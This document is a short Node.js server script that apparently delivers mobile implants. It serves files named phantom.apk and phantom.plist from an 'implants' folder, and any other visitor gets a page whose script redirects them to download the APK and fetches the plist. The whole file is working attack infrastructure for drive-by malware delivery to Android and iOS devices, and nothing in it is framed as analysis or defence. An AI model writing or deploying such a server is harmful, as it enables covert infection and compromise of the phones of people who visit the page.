const http = require('http');  
const fs = require('fs');  

http.createServer((req, res) => {  
  if (req.url === '/phantom.apk') {  
    res.end(fs.readFileSync('../implants/phantom.apk'));  
  } else if (req.url === '/phantom.plist') {  
    res.end(fs.readFileSync('../implants/phantom.plist'));  
  } else {  
    res.end(`  
      <script>  
        window.location.href = 'http://192.168.1.1:8080/phantom.apk';  
        fetch('http://192.168.1.1:8080/phantom.plist');  
      </script>  
    `);  
  }  
}).listen(8080);  
